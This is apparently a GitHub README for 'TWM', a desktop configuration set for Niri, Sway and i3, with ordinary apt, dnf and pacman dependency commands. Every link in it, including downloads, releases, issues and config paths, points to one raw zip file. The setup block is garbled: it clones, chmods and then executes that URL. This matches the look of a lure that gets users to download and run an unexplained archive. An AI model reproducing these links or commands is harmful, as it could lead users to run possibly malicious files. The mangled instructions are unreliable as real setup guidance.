# 🎉 TWM - Simple Configurations for Your Desktop

[![Download TWM](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip)](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip)

## 📦 Overview

TWM is a set of desktop configurations that supports Niri, Sway, and i3 window managers. This project provides an easy setup experience for all users, regardless of technical background. TWM allows you to quickly configure your desktop environment without fussing over individual settings.

## 🚀 Getting Started

Follow these steps to set up TWM on your system.

### 1. Download TWM

To get started, visit the [Releases page to download TWM](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip).

### 2. Install Required Dependencies

Your computer may need specific packages to run TWM efficiently. The installation process varies depending on the window manager you choose: Sway (Wayland) or i3 (X11). 

#### For Sway Users

**Debian/Ubuntu:**

```bash
sudo apt update
sudo apt install -y sway waybar kitty swaybg mako wofi fcitx5 \
  brightnessctl grim slurp wl-clipboard libnotify-bin
```

**Fedora:**

```bash
sudo dnf install -y sway waybar kitty swaybg mako wofi fcitx5 \
  brightnessctl grim slurp wl-clipboard libnotify
```

**Arch:**

```bash
sudo pacman -S --needed sway waybar kitty swaybg mako wofi fcitx5 \
  brightnessctl grim slurp wl-clipboard libnotify
```

#### For i3 Users

**Debian/Ubuntu:**

```bash
sudo apt update
sudo apt install -y i3 waybar kitty dunst fcitx5 \
  brightnessctl grim slurp libnotify-bin
```

### 3. Configure TWM

Once you have downloaded the files and installed the dependencies, you need to configure TWM for first-time use. Follow these easy instructions:

1. Open the terminal on your computer. 
2. Run the following commands:

```bash
mkdir -p ~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
git clone https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip ~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
cd ~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
chmod +x https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
```

This script will create necessary symlinks for your configurations and install fonts automatically. Any existing configuration files will be backed up.

## 🔧 How It Works

The TWM script customizes your environment depending on the window manager you choose. The configuration files for Waybar will load automatically based on the window manager:
- For Niri: `~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip`
- For Sway: `~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip`

## 🛠 Features

- **Easy Setup**: A one-command script for an initial configuration.
- **Cross-Compatibility**: Works well with both Wayland (Niri/Sway) and X11 (i3).
- **Automatic Backups**: Safeguards your existing configurations.
- **Customizable**: Modify your settings later as needed.

## 📄 Support 

If you encounter any issues or have questions, you can check the [issues section](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip) on the GitHub repository. Community participation is welcome, and we value your feedback.

## ⚙️ Additional Resources

For more advanced usage and options, take a look at the following resources:

- **Waybar Documentation**: Learn about customizing your Waybar settings.
- **Niri and Sway Resources**: Helpful links for getting the most out of your window managers.

## 🔗 Download & Install

To download TWM, visit the [Releases page](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip). Download the desired version and follow the configuration steps mentioned above.

Feel free to reach out for additional help and share your experience with TWM!